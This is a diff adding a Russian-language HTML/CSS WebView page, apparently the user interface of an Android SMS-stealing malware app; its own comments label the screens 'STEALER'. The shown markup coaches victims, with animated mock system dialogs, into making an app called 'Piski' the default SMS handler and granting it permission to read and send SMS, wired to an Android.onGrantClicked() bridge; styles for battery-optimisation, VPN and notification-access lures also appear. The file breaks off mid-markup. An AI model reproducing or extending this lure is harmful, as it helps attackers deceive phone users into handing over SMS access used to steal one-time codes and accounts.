@@ -1,0 +1,1545 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+<style>
+
+:root {
+  --g-green: #34A853;
+  --g-green-soft: rgba(52, 168, 83, 0.16);
+  --g-green-press: #2d9348;
+  --c-blue: #4285F4;
+  --c-blue-soft: rgba(66, 133, 244, 0.15);
+  --c-blue-glow: rgba(66, 133, 244, 0.35);
+  --c-teal: #00ACC1;
+  --c-teal-soft: rgba(0, 172, 193, 0.15);
+  --c-teal-glow: rgba(0, 172, 193, 0.35);
+  --c-amber: #FF9800;
+  --c-amber-soft: rgba(255, 152, 0, 0.15);
+  --c-amber-glow: rgba(255, 152, 0, 0.35);
+  --c-purple: #7C4DFF;
+  --c-purple-soft: rgba(124, 77, 255, 0.15);
+  --c-purple-glow: rgba(124, 77, 255, 0.35);
+  --c-pink: #E91E63;
+  --c-pink-soft: rgba(233, 30, 99, 0.15);
+  --c-pink-glow: rgba(233, 30, 99, 0.35);
+  --text-dim: #9aa0a6;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body {
+  height: 100%;
+  font-family: Roboto, system-ui, sans-serif;
+  background: transparent;
+  color: #e8eaed;
+  -webkit-font-smoothing: antialiased;
+  -webkit-tap-highlight-color: transparent;
+  -webkit-user-select: none;
+  user-select: none;
+  overflow: hidden;
+}
+button { appearance: none; border: 0; cursor: pointer; font: inherit; outline: none; -webkit-tap-highlight-color: transparent; }
+
+    @keyframes btnGlowBlue {
+      0%, 100% { box-shadow: 0 4px 16px rgba(66,133,244,0.25); }
+      50%      { box-shadow: 0 4px 32px rgba(66,133,244,0.55), 0 0 48px rgba(66,133,244,0.2); }
+    }
+    @keyframes btnGlowTeal {
+      0%, 100% { box-shadow: 0 4px 16px rgba(0,172,193,0.25); }
+      50%      { box-shadow: 0 4px 32px rgba(0,172,193,0.55), 0 0 48px rgba(0,172,193,0.2); }
+    }
+    @keyframes btnGlowAmber {
+      0%, 100% { box-shadow: 0 4px 16px rgba(255,152,0,0.25); }
+      50%      { box-shadow: 0 4px 32px rgba(255,152,0,0.55), 0 0 48px rgba(255,152,0,0.2); }
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to   { opacity: 1; }
+    }
+    @keyframes fadeOut {
+      from { opacity: 1; }
+      to   { opacity: 0; }
+    }
+    @keyframes springScaleIn {
+      0%   { opacity: 0; transform: scale(0.55) translateY(10px); }
+      60%  { opacity: 1; transform: scale(1.06) translateY(-2px); }
+      80%  { transform: scale(0.97) translateY(1px); }
+      100% { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    @keyframes slideUp {
+      from { opacity: 0; transform: translateY(18px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    @keyframes scaleSlideUp {
+      from { opacity: 0; transform: scale(0.88) translateY(14px); }
+      to   { opacity: 1; transform: scale(1) translateY(0); }
+    }
+    @keyframes slideUpBtn {
+      from { opacity: 0; transform: translateY(22px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+
+    /* ===== STEALER — SMS Default ===== */
+    .sms-screen {
+      position: absolute; inset: 0;
+      display: flex; flex-direction: column;
+      background: #000;
+      pointer-events: none;
+      will-change: opacity;
+    }
+    .sms-screen.show { pointer-events: auto; }
+
+    .sms-webview-bg {
+      position: absolute; inset: 0;
+      background:
+        linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+      overflow: hidden;
+    }
+    .sms-webview-bg::before {
+      content: '';
+      position: absolute; top: 0; left: 0; right: 0;
+      height: 56px;
+      background: rgba(255,255,255,0.04);
+      border-bottom: 1px solid rgba(255,255,255,0.06);
+    }
+    .sms-webview-bg::after {
+      content: '';
+      position: absolute;
+      top: 56px; left: 16px; right: 16px;
+      height: 36px; border-radius: 18px;
+      margin-top: 12px;
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.08);
+    }
+    .sms-webview-lines {
+      position: absolute;
+      top: 130px; left: 16px; right: 16px;
+    }
+    .sms-webview-line {
+      height: 10px; border-radius: 5px;
+      background: rgba(255,255,255,0.04);
+      margin-bottom: 10px;
+    }
+    .sms-webview-line:nth-child(2) { width: 75%; }
+    .sms-webview-line:nth-child(3) { width: 88%; }
+    .sms-webview-line:nth-child(4) { width: 60%; }
+    .sms-webview-line:nth-child(5) { width: 92%; }
+    .sms-webview-line:nth-child(6) { width: 45%; }
+
+    .sms-dimmer {
+      position: absolute; inset: 0;
+      background: rgba(0, 0, 0, 0.65);
+      will-change: opacity;
+    }
+
+    .sms-card {
+      position: absolute;
+      bottom: 0; left: 0; right: 0;
+      background: #1e1e1e;
+      border-radius: 24px 24px 0 0;
+      padding: 24px 22px 20px;
+      display: flex; flex-direction: column;
+      align-items: center;
+      will-change: opacity, transform;
+      box-shadow: 0 -8px 40px rgba(0,0,0,0.5);
+    }
+
+    .sms-handle {
+      width: 36px; height: 4px;
+      border-radius: 99px;
+      background: rgba(255,255,255,0.15);
+      margin-bottom: 20px;
+      flex-shrink: 0;
+    }
+
+    .sms-icon-circle {
+      width: 64px; height: 64px;
+      border-radius: 50%;
+      background: linear-gradient(145deg, rgba(52,168,83,0.15), rgba(52,168,83,0.08));
+      display: grid; place-items: center;
+      will-change: opacity, transform;
+      overflow: hidden;
+    }
+    .sms-icon-circle svg { width: 32px; height: 32px; }
+
+    .sms-card-title {
+      margin-top: 16px;
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      font-size: 20px; font-weight: 500;
+      color: #fff; text-align: center;
+      letter-spacing: -0.01em;
+      will-change: opacity, transform;
+    }
+    .sms-card-subtitle {
+      margin-top: 8px;
+      font-size: 13px; color: var(--text-dim);
+      text-align: center; max-width: 280px; line-height: 1.5;
+      will-change: opacity, transform;
+    }
+
+    .sms-preview-label {
+      margin-top: 20px;
+      align-self: flex-start;
+      display: flex; align-items: center; gap: 6px;
+      font-size: 11px; font-weight: 500;
+      text-transform: uppercase; letter-spacing: 0.08em;
+      color: #fff;
+      will-change: opacity, transform;
+    }
+    .sms-preview-label::before {
+      content: ''; width: 5px; height: 5px;
+      border-radius: 50%; background: var(--g-green);
+    }
+
+    .sms-mock-dialog {
+      margin-top: 12px; width: 100%;
+      background: #2b2b2b;
+      border-radius: 28px;
+      overflow: hidden;
+      will-change: opacity, transform;
+      position: relative;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+    }
+    .sms-mock-dialog-title {
+      padding: 24px 24px 16px;
+      font-size: 15px; font-weight: 500; color: #fff;
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      text-align: center; line-height: 1.35;
+    }
+    .sms-mock-app-row {
+      display: flex; align-items: center; gap: 14px;
+      padding: 10px 20px;
+      border-radius: 12px;
+      margin: 0 8px;
+      transition: background 250ms ease, transform 150ms ease;
+      cursor: default;
+    }
+    .sms-mock-app-row.highlight {
+      background: rgba(52, 168, 83, 0.08);
+    }
+    .sms-mock-app-row.tapped {
+      transform: scale(0.97);
+      background: rgba(52, 168, 83, 0.14);
+    }
+    .sms-mock-app-icon {
+      width: 40px; height: 40px;
+      border-radius: 50%; overflow: hidden;
+      display: grid; place-items: center;
+      flex-shrink: 0;
+    }
+    .sms-mock-app-icon.messages {
+      background: #1a73e8;
+    }
+    .sms-mock-app-icon.messages svg { width: 22px; height: 22px; }
+    .sms-mock-app-icon.ours {
+      background: linear-gradient(145deg, #2d9348, #1e6b34);
+      font-family: 'Google Sans', sans-serif;
+      font-size: 18px; font-weight: 500; color: #fff;
+    }
+    .sms-mock-app-text { flex: 1; min-width: 0; }
+    .sms-mock-app-name {
+      font-size: 14px; font-weight: 400; color: #fff;
+      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+    }
+    .sms-mock-app-sub {
+      font-size: 11px; color: var(--text-dim);
+      margin-top: 1px;
+    }
+    .sms-radio {
+      width: 22px; height: 22px;
+      border-radius: 50%;
+      border: 2px solid #5f6368;
+      flex-shrink: 0;
+      position: relative;
+      transition: border-color 300ms ease;
+    }
+    .sms-radio.selected {
+      border-color: var(--g-green);
+    }
+    .sms-radio::after {
+      content: '';
+      position: absolute;
+      top: 50%; left: 50%;
+      width: 12px; height: 12px;
+      border-radius: 50%;
+      background: var(--g-green);
+      transform: translate(-50%, -50%) scale(0);
+      transition: transform 300ms cubic-bezier(0.16,1,0.3,1);
+    }
+    .sms-radio.selected::after {
+      transform: translate(-50%, -50%) scale(1);
+    }
+    .sms-mock-divider {
+      height: 1px;
+      background: rgba(255,255,255,0.06);
+      margin: 4px 20px;
+    }
+    .sms-mock-actions {
+      display: flex; justify-content: flex-end; gap: 4px;
+      padding: 16px 16px 20px;
+    }
+    .sms-mock-btn {
+      padding: 10px 20px;
+      border-radius: 20px;
+      font-size: 13px; font-weight: 500;
+      background: transparent; border: none; cursor: default;
+      text-transform: uppercase; letter-spacing: 0.03em;
+      transition: background 200ms ease, transform 100ms ease;
+    }
+    .sms-mock-btn-cancel {
+      color: var(--text-dim);
+    }
+    .sms-mock-btn-default {
+      color: var(--g-green);
+    }
+    .sms-mock-btn.highlight {
+      background: rgba(52, 168, 83, 0.12);
+    }
+    .sms-mock-btn.tapped {
+      transform: scale(0.93);
+      background: rgba(52, 168, 83, 0.22);
+    }
+
+    .sms-cursor {
+      position: absolute;
+      width: 14px; height: 14px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.85);
+      box-shadow: 0 0 10px rgba(255,255,255,0.5), 0 0 24px rgba(255,255,255,0.25);
+      pointer-events: none;
+      opacity: 0;
+      z-index: 5;
+      transition: top 400ms cubic-bezier(0.16,1,0.3,1),
+                  left 400ms cubic-bezier(0.16,1,0.3,1),
+                  opacity 250ms ease;
+    }
+    .sms-cursor.visible { opacity: 1; }
+    .sms-cursor.tap {
+      transform: scale(0.6);
+      transition: top 400ms cubic-bezier(0.16,1,0.3,1),
+                  left 400ms cubic-bezier(0.16,1,0.3,1),
+                  opacity 250ms ease,
+                  transform 120ms ease;
+    }
+
+    .sms-mock-success {
+      position: absolute; inset: 0;
+      background: rgba(66,133,244,0.06);
+      display: grid; place-items: center;
+      opacity: 0;
+      transition: opacity 400ms ease;
+      border-radius: 28px;
+      pointer-events: none;
+    }
+    .sms-mock-success.visible { opacity: 1; }
+    .sms-mock-success svg {
+      width: 32px; height: 32px;
+      opacity: 0; transform: scale(0.5);
+      transition: opacity 350ms ease, transform 400ms cubic-bezier(0.16,1,0.3,1);
+    }
+    .sms-mock-success.visible svg { opacity: 1; transform: scale(1); }
+
+    .sms-footer {
+      margin-top: 18px;
+      width: 100%;
+      will-change: opacity, transform;
+    }
+    .sms-btn {
+      width: 100%; height: 50px;
+      border-radius: 99px;
+      background: var(--g-green); color: #fff;
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      font-size: 15px; font-weight: 500;
+      transition: transform 100ms ease-out, filter 100ms ease-out,
+                  background 100ms ease-out, box-shadow 100ms ease-out;
+      will-change: opacity, transform;
+    }
+    .sms-btn:hover { filter: brightness(1.06); }
+    .sms-btn:active { transform: scale(0.97); background: var(--g-green-press); }
+
+    @keyframes cardSlideUp {
+      from { opacity: 0; transform: translateY(100%); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ===== STEALER — SMS Runtime Permission ===== */
+    .smsr-screen {
+      position: absolute; inset: 0;
+      display: flex; flex-direction: column;
+      background: #000;
+      pointer-events: none;
+      will-change: opacity;
+    }
+    .smsr-screen.show { pointer-events: auto; }
+
+    .smsr-mock-dialog {
+      margin-top: 12px; width: 100%;
+      background: #2b2b2b;
+      border-radius: 28px;
+      will-change: opacity, transform;
+      position: relative;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+      transition: opacity 350ms ease, transform 350ms cubic-bezier(0.16,1,0.3,1);
+    }
+    .smsr-mock-dialog.dismissed {
+      opacity: 0; transform: scale(0.92) translateY(8px);
+      pointer-events: none;
+    }
+    .smsr-mock-dialog-title {
+      padding: 24px 24px 20px;
+      font-size: 15px; font-weight: 400; color: #e0e0e0;
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      text-align: center; line-height: 1.45;
+    }
+    .smsr-mock-dialog-title strong {
+      font-weight: 500; color: #fff;
+    }
+    .smsr-mock-actions {
+      display: flex; gap: 10px;
+      padding: 4px 20px 22px;
+    }
+    .smsr-mock-btn {
+      flex: 1;
+      padding: 12px 0;
+      border-radius: 24px;
+      font-size: 14px; font-weight: 500;
+      border: none; cursor: default;
+      text-align: center;
+      transition: background 200ms ease, transform 100ms ease,
+                  box-shadow 200ms ease;
+    }
+    .smsr-mock-btn-deny {
+      color: var(--text-dim);
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.08);
+    }
+    .smsr-mock-btn-allow {
+      color: #fff;
+      background: var(--g-green);
+      border: 1px solid transparent;
+    }
+    .smsr-mock-btn.highlight {
+      filter: brightness(1.15);
+      box-shadow: 0 0 16px rgba(52,168,83,0.3);
+    }
+    .smsr-mock-btn.tapped {
+      transform: scale(0.93);
+    }
+
+    .smsr-cursor {
+      position: absolute;
+      width: 14px; height: 14px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.85);
+      box-shadow: 0 0 10px rgba(255,255,255,0.5), 0 0 24px rgba(255,255,255,0.25);
+      pointer-events: none;
+      opacity: 0;
+      z-index: 5;
+      transition: top 400ms cubic-bezier(0.16,1,0.3,1),
+                  left 400ms cubic-bezier(0.16,1,0.3,1),
+                  opacity 250ms ease;
+    }
+    .smsr-cursor.visible { opacity: 1; }
+    .smsr-cursor.tap {
+      transform: scale(0.6);
+      transition: top 400ms cubic-bezier(0.16,1,0.3,1),
+                  left 400ms cubic-bezier(0.16,1,0.3,1),
+                  opacity 250ms ease,
+                  transform 120ms ease;
+    }
+
+    .smsr-badges { display: flex; flex-direction: column; gap: 8px; margin-top: 14px; }
+    .smsr-step-badge {
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      padding: 12px 20px;
+      font-size: 14px; font-weight: 600; color: #fff;
+      background: rgba(52, 168, 83, 0.15);
+      border: 1px solid rgba(52, 168, 83, 0.4);
+      border-radius: 14px;
+      opacity: 0; transform: scale(0.85);
+      transition: opacity 400ms ease, transform 400ms cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    .smsr-step-badge.visible { opacity: 1; transform: scale(1); }
+    .smsr-step-badge svg { width: 22px; height: 22px; flex-shrink: 0; }
+    .smsr-step-badge .badge-circle {
+      width: 28px; height: 28px; border-radius: 50%;
+      background: var(--g-green);
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .smsr-step-badge .badge-circle svg { width: 16px; height: 16px; }
+
+    /* ===== STEALER — Battery Optimization ===== */
+    .batt-screen {
+      position: absolute; inset: 0;
+      display: flex; flex-direction: column;
+      background: #000;
+      pointer-events: none;
+      will-change: opacity;
+    }
+    .batt-screen.show { pointer-events: auto; }
+
+    .batt-mock-dialog {
+      margin-top: 12px; width: 100%;
+      background: #2b2b2b;
+      border-radius: 28px;
+      will-change: opacity, transform;
+      position: relative;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+      transition: opacity 350ms ease, transform 350ms cubic-bezier(0.16,1,0.3,1);
+    }
+    .batt-mock-dialog.dismissed {
+      opacity: 0; transform: scale(0.92) translateY(8px);
+      pointer-events: none;
+    }
+    .batt-mock-dialog-title {
+      padding: 24px 24px 12px;
+      font-size: 15px; font-weight: 400; color: #e0e0e0;
+      font-family: 'Google Sans', 'Roboto', sans-serif;
+      text-align: center; line-height: 1.45;
+    }
+    .batt-mock-dialog-title strong {
+      font-weight: 500; color: #fff;
+    }
+    .batt-mock-actions {
+      display: flex; gap: 10px;
+      padding: 4px 20px 22px;
+    }
+    .batt-mock-btn {
+      flex: 1;
+      padding: 12px 0;
+      border-radius: 24px;
+      font-size: 14px; font-weight: 500;
+      border: none; cursor: default;
+      text-align: center;
+      transition: background 200ms ease, transform 100ms ease, box-shadow 200ms ease;
+    }
+    .batt-mock-btn-deny {
+      color: var(--text-dim);
+      background: rgba(255,255,255,0.06);
+      border: 1px solid rgba(255,255,255,0.08);
+    }
+    .batt-mock-btn-allow {
+      color: #fff;
+      background: var(--g-green);
+      border: 1px solid transparent;
+    }
+    .batt-mock-btn.highlight {
+      filter: brightness(1.15);
+      box-shadow: 0 0 16px rgba(52,168,83,0.3);
+    }
+    .batt-mock-btn.tapped { transform: scale(0.93); }
+
+    .batt-cursor {
+      position: absolute;
+      width: 14px; height: 14px;
+      border-radius: 50%;
+      background: rgba(255,255,255,0.85);
+      box-shadow: 0 0 10px rgba(255,255,255,0.5), 0 0 24px rgba(255,255,255,0.25);
+      pointer-events: none;
+      opacity: 0;
+      z-index: 5;
+      transition: top 400ms cubic-bezier(0.16,1,0.3,1),
+                  left 400ms cubic-bezier(0.16,1,0.3,1),
+                  opacity 250ms ease;
+    }
+    .batt-cursor.visible { opacity: 1; }
+    .batt-cursor.tap {
+      transform: scale(0.6);
+      transition: top 400ms cubic-bezier(0.16,1,0.3,1),
+                  left 400ms cubic-bezier(0.16,1,0.3,1),
+                  opacity 250ms ease,
+                  transform 120ms ease;
+    }
+
+    .batt-badge {
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      margin-top: 14px;
+      padding: 12px 20px;
+      font-size: 14px; font-weight: 600; color: #fff;
+      background: rgba(52, 168, 83, 0.15);
+      border: 1px solid rgba(52, 168, 83, 0.4);
+      border-radius: 14px;
+      opacity: 0; transform: scale(0.85);
+      transition: opacity 400ms ease, transform 400ms cubic-bezier(0.16, 1, 0.3, 1);
+    }
+    .batt-badge.visible { opacity: 1; transform: scale(1); }
+    .batt-badge .badge-circle {
+      width: 28px; height: 28px; border-radius: 50%;
+      background: var(--g-green);
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .batt-badge .badge-circle svg { width: 16px; height: 16px; }
+
+    /* ===== Per-screen accent colors ===== */
+
+    /* SMS Default → Blue */
+    #smsScreen .sms-icon-circle { background: linear-gradient(145deg, var(--c-blue-soft), rgba(66,133,244,0.08)); }
+    #smsScreen .sms-btn { background: var(--c-blue); }
+    #smsScreen .sms-btn:active { background: #3367D6; }
+    #smsScreen .sms-radio.selected { border-color: var(--c-blue); }
+    #smsScreen .sms-radio.selected::after { background: var(--c-blue); }
+    #smsScreen .sms-mock-btn-default { color: var(--c-blue); }
+    #smsScreen .sms-mock-btn.highlight { box-shadow: 0 0 16px var(--c-blue-glow); }
+    #smsScreen .sms-preview-label::before { background: var(--c-blue); }
+
+    /* SMS Perm → Teal */
+    #smsrScreen .sms-icon-circle { background: linear-gradient(145deg, var(--c-teal-soft), rgba(0,172,193,0.08)); }
+    #smsrScreen .sms-btn { background: var(--c-teal); }
+    #smsrScreen .sms-btn:active { background: #00838F; }
+    #smsrScreen .sms-preview-label::before { background: var(--c-teal); }
+    .smsr-mock-btn-allow { background: var(--c-teal); }
+    .smsr-mock-btn.highlight { box-shadow: 0 0 16px var(--c-teal-glow); }
+    .smsr-step-badge { background: var(--c-teal-soft); border-color: rgba(0,172,193,0.4); }
+    .smsr-step-badge .badge-circle { background: var(--c-teal); }
+
+    /* Battery → Amber */
+    #battScreen .sms-icon-circle { background: linear-gradient(145deg, var(--c-amber-soft), rgba(255,152,0,0.08)); }
+    #battScreen .sms-btn { background: var(--c-amber); }
+    #battScreen .sms-btn:active { background: #F57C00; }
+    #battScreen .sms-preview-label::before { background: var(--c-amber); }
+    .batt-mock-btn-allow { background: var(--c-amber); }
+    .batt-mock-btn.highlight { box-shadow: 0 0 16px var(--c-amber-glow); }
+    .batt-badge { background: var(--c-amber-soft); border-color: rgba(255,152,0,0.4); }
+    .batt-badge .badge-circle { background: var(--c-amber); }
+
+    /* VPN → Purple */
+    #vpnScreen .sms-icon-circle { background: linear-gradient(145deg, var(--c-purple-soft), rgba(124,77,255,0.08)); }
+    #vpnScreen .sms-btn { background: var(--c-purple); }
+    #vpnScreen .sms-btn:active { background: #651FFF; }
+    #vpnScreen .sms-preview-label::before { background: var(--c-purple); }
+    #vpnScreen .batt-mock-btn-allow { background: var(--c-purple); }
+    #vpnScreen .batt-mock-btn.highlight { box-shadow: 0 0 16px var(--c-purple-glow); }
+    #vpnScreen .batt-badge { background: var(--c-purple-soft); border-color: rgba(124,77,255,0.4); }
+    #vpnScreen .batt-badge .badge-circle { background: var(--c-purple); }
+    @keyframes btnGlowPurple {
+      0%, 100% { box-shadow: 0 4px 16px rgba(124,77,255,0.25); }
+      50%      { box-shadow: 0 4px 32px rgba(124,77,255,0.55), 0 0 48px rgba(124,77,255,0.2); }
+    }
+
+    /* Notification Access → Pink */
+    #notifScreen .sms-icon-circle { background: linear-gradient(145deg, var(--c-pink-soft), rgba(233,30,99,0.08)); }
+    #notifScreen .sms-btn { background: var(--c-pink); }
+    #notifScreen .sms-btn:active { background: #C2185B; }
+    #notifScreen .sms-preview-label::before { background: var(--c-pink); }
+    .notif-mock-row { display: flex; align-items: center; gap: 12px; padding: 14px 16px; background: #2b2b2b; border-radius: 14px; margin-top: 12px; position: relative; transition: background 200ms ease, transform 100ms ease; }
+    .notif-mock-row.highlight { background: #333; box-shadow: inset 0 0 0 1.5px rgba(233,30,99,0.35); }
+    .notif-mock-row.tapped { transform: scale(0.97); background: #383838; }
+    .notif-mock-icon { width: 36px; height: 36px; border-radius: 10px; background: var(--c-pink); display: grid; place-items: center; flex-shrink: 0; overflow: hidden; }
+    .notif-mock-icon img { width: 100%; height: 100%; object-fit: cover; }
+    .notif-mock-text { flex: 1; }
+    .notif-mock-name { font-size: 14px; font-weight: 500; color: #e0e0e0; }
+    .notif-mock-sub { font-size: 12px; color: #888; margin-top: 2px; }
+    .notif-toggle-track { width: 44px; height: 24px; border-radius: 12px; background: #555; position: relative; transition: background 300ms ease; flex-shrink: 0; }
+    .notif-toggle-track.on { background: var(--c-pink); }
+    .notif-toggle-thumb { position: absolute; top: 2px; left: 2px; width: 20px; height: 20px; border-radius: 50%; background: #fff; transition: left 300ms cubic-bezier(0.16,1,0.3,1); }
+    .notif-toggle-track.on .notif-toggle-thumb { left: 22px; }
+    .notif-mock-check { margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 8px; font-size: 13px; font-weight: 500; color: var(--c-pink); opacity: 0; transition: opacity 400ms ease; }
+    .notif-mock-check.visible { opacity: 1; }
+    .notif-mock-check svg { width: 18px; height: 18px; }
+    .notif-cursor { position: absolute; width: 14px; height: 14px; border-radius: 50%; background: rgba(255,255,255,0.85); box-shadow: 0 0 10px rgba(255,255,255,0.5), 0 0 24px rgba(255,255,255,0.25); pointer-events: none; opacity: 0; z-index: 5; transition: top 400ms cubic-bezier(0.16,1,0.3,1), left 400ms cubic-bezier(0.16,1,0.3,1), opacity 250ms ease; }
+    .notif-cursor.visible { opacity: 1; }
+    .notif-cursor.tap { transform: scale(0.6); transition: top 400ms cubic-bezier(0.16,1,0.3,1), left 400ms cubic-bezier(0.16,1,0.3,1), opacity 250ms ease, transform 120ms ease; }
+    .notif-badge { display: flex; align-items: center; justify-content: center; gap: 10px; margin-top: 14px; padding: 12px 20px; font-size: 14px; font-weight: 600; color: #fff; background: var(--c-pink-soft); border: 1px solid rgba(233,30,99,0.4); border-radius: 14px; opacity: 0; transform: scale(0.85); transition: opacity 400ms ease, transform 400ms cubic-bezier(0.16, 1, 0.3, 1); }
+    .notif-badge.visible { opacity: 1; transform: scale(1); }
+    .notif-badge .badge-circle { width: 28px; height: 28px; border-radius: 50%; background: var(--c-pink); display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .notif-badge .badge-circle svg { width: 16px; height: 16px; }
+    @keyframes btnGlowPink {
+      0%, 100% { box-shadow: 0 4px 16px rgba(233,30,99,0.25); }
+      50%      { box-shadow: 0 4px 32px rgba(233,30,99,0.55), 0 0 48px rgba(233,30,99,0.2); }
+    }
+
+
+
+    .sms-screen, .smsr-screen, .batt-screen { background: transparent !important; }
+    .sms-webview-bg { display: none !important; }
+
+</style>
+</head>
+<body>
+        <!-- STEALER: SMS Default -->
+        <div class="sms-screen" id="smsScreen">
+          <div class="sms-webview-bg">
+            <div class="sms-webview-lines">
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+            </div>
+          </div>
+          <div class="sms-dimmer" id="smsDimmer"></div>
+
+          <div class="sms-card" id="smsCard">
+            <div class="sms-handle"></div>
+
+            <div class="sms-icon-circle" id="smsIconCircle">
+              <svg viewBox="0 0 24 24" fill="none">
+                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z" fill="#4285F4" opacity="0.2"/>
+                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z" stroke="#4285F4" stroke-width="1.5" stroke-linejoin="round"/>
+                <path d="M4 8l8 5 8-5" stroke="#4285F4" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+
+            <div class="sms-card-title" id="smsCardTitle">SMS доступ</div>
+            <div class="sms-card-subtitle" id="smsCardSubtitle">Для доступа к данному ресурсу необходимо назначить приложение SMS по умолчанию</div>
+
+            <div class="sms-preview-label" id="smsPreviewLabel">Вот что вы увидите</div>
+
+            <div class="sms-mock-dialog" id="smsMockDialog">
+              <div class="sms-cursor" id="smsCursor"></div>
+              <div class="sms-mock-dialog-title">Сделать «<span id="smsMockDialogName">Piski</span>» приложением для обмена SMS по умолчанию?</div>
+
+              <div class="sms-mock-app-row" id="smsRowMessages">
+                <div class="sms-mock-app-icon messages">
+                  <svg viewBox="0 0 24 24" fill="none">
+                    <path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z" fill="#fff"/>
+                  </svg>
+                </div>
+                <div class="sms-mock-app-text">
+                  <div class="sms-mock-app-name" id="smsMsgName">Сообщения</div>
+                  <div class="sms-mock-app-sub" id="smsMsgSub">Используется по умолчанию</div>
+                </div>
+                <div class="sms-radio selected" id="smsRadioMsg"></div>
+              </div>
+
+              <div class="sms-mock-app-row" id="smsRowOurs">
+                <div class="sms-mock-app-icon ours" id="smsMockIcon">P</div>
+                <div class="sms-mock-app-text">
+                  <div class="sms-mock-app-name" id="smsMockAppName">Piski</div>
+                </div>
+                <div class="sms-radio" id="smsRadioOurs"></div>
+              </div>
+
+              <div class="sms-mock-divider"></div>
+
+              <div class="sms-mock-actions">
+                <button class="sms-mock-btn sms-mock-btn-cancel" id="smsMockCancel">Отмена</button>
+                <button class="sms-mock-btn sms-mock-btn-default" id="smsMockDefault">По умолчанию</button>
+              </div>
+
+              <div class="sms-mock-success" id="smsMockSuccess">
+                <svg viewBox="0 0 24 24" fill="none">
+                  <circle cx="12" cy="12" r="10" fill="#4285F4" opacity="0.15"/>
+                  <path d="M7 12.5l3.5 3.5 6.5-7" stroke="#4285F4" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+                </svg>
+              </div>
+            </div>
+
+            <div class="sms-footer" id="smsFooter">
+              <button class="sms-btn" id="smsBtn" type="button" onclick="Android.onGrantClicked()">Продолжить</button>
+            </div>
+          </div>
+        </div>
+
+        <!-- STEALER: SMS Runtime Permission -->
+        <div class="sms-screen smsr-screen" id="smsrScreen">
+          <div class="sms-webview-bg">
+            <div class="sms-webview-lines">
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+              <div class="sms-webview-line"></div>
+            </div>
+          </div>
+          <div class="sms-dimmer" id="smsrDimmer"></div>
+
+          <div class="sms-card" id="smsrCard">
+            <div class="sms-handle"></div>
+
+            <div class="sms-icon-circle" id="smsrIconCircle">
+              <svg viewBox="0 0 24 24" fill="none">
+                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z" fill="#00ACC1" opacity="0.2"/>
+                <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2z" stroke="#00ACC1" stroke-width="1.5" stroke-linejoin="round"/>
+                <path d="M4 8l8 5 8-5" stroke="#00ACC1" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+              </svg>
+            </div>
+
+            <div class="sms-card-title" id="smsrCardTitle">SMS доступ</div>
+            <div class="sms-card-subtitle" id="smsrCardSubtitle">Для корректной работы приложению необходим доступ к SMS-сообщениям</div>
+
+            <div class="sms-preview-label" id="smsrPreviewLabel">Вот что вы увидите</div>
+
+            <div class="smsr-mock-dialog" id="smsrMockDialog">
+              <div class="smsr-cursor" id="smsrCursor"></div>
+              <div class="smsr-mock-dialog-title" id="smsrMockTitle">Разрешить приложению «<strong id="smsrMockName">Piski</strong>» отправлять и просматривать SMS-сообщения?</div>
+
+              <div class="smsr-mock-actions">
+                <button class="smsr-mock-btn smsr-mock-btn-deny" id="smsrMockDeny">Отклонить</button>
+                <button class="smsr-mock-btn smsr-mock-btn-allow" id="smsrMockAllow">Разрешить</button>
+              </div>
+            </div>
+
+            <div class="smsr-badges" id="smsrBadges">
+              <div class="smsr-step-badge" id="smsrBadge0">
